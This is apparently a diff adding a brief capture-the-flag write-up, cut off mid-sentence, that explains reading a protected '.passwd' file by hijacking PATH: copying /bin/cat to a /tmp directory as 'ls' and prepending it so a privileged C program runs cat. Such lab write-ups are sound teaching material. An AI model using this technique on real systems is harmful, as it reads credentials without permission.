@@ -1,0 +1,23 @@
+By listing the initial directory, can view two interesting files:
+A C file and a compiled binary. 
+
+By ating the C file, can see that it does an 'ls' to the hidden file '.passwd'
+You are not the owner of these files, so you can't do a cat because you do not have permissions. 
+
+So, let's check where have write permissions:
+
+ls -la /
+
+The C file does an 'ls' on the '.passwd' file. So we can replace de 'ls' command.
+
+mkdir /tmp/hehehe/
+
+cp /bin/cat /tmp/hehehe/ls
+
+Let's to add this directory to the beginning of the PATH
+
+export PATH=/tmp/hehehe:$PATH
+
+Now when doing 'ls' actually does 'cat' 
+
+So...
